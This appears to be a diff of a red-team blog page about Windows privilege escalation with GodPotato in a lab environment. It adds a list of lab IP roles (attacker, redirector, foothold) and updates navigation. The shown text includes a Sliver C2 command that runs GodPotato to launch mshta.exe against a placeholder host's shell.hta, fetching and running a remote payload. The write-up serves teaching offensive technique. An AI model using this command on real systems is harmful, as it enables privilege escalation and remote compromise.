@@ -128,6 +128,12 @@ This post is a continuation for an alternate way to escalate our privilege after
 
 <span id="more"></span>
 
+<h2 id="Players"><a href="#Players" class="headerlink" title="Players"></a>Players</h2><ul>
+<li><strong>Initial Foothold</strong>: 192.168.25.22, castelblack.north.sevenkingdoms.com</li>
+<li><strong>Attacker machine</strong>: 192.168.25.128</li>
+<li><strong>Redirector machine</strong>: 192.168.25.138</li>
+<li><strong>Firewall</strong>: 192.168.24.138</li>
+</ul>
 <h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The exploitation is very simple, first we need to download the binary from the <a href="https://github.com/BeichenDream/GodPotato" title="" target="">source on github</a>.<br>Then we can use our C2 to execute it.</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sliver (PARALLEL_SEASIDE) &gt; execute-assembly -M -E /opt/godpotato/GodPotato-NET4.exe -cmd \&quot;cmd.exe /C &#x27;mshta.exe https://fake-host.com/shell.hta&#x27;\&quot;</span><br></pre></td></tr></table></figure>
 
@@ -200,7 +206,7 @@ This post is a continuation for an alternate way to escalate our privilege after
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/">red team<span>8</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/privilege-escalation/">privilege escalation<span>5</span></a></li>
+    <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/">red team<span>9</span></a></li> <li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/privilege-escalation/">privilege escalation<span>6</span></a></li>
   </li>
 
     </ul>
@@ -224,7 +230,7 @@ This post is a continuation for an alternate way to escalate our privilege after
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Introduction"><span class="toc-article-text">Introduction</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exploitation"><span class="toc-article-text">Exploitation</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Observation"><span class="toc-article-text">Observation</span></a></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Introduction"><span class="toc-article-text">Introduction</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Players"><span class="toc-article-text">Players</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exploitation"><span class="toc-article-text">Exploitation</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Observation"><span class="toc-article-text">Observation</span></a></li></ol>
 		</div>
 	
 	</div>
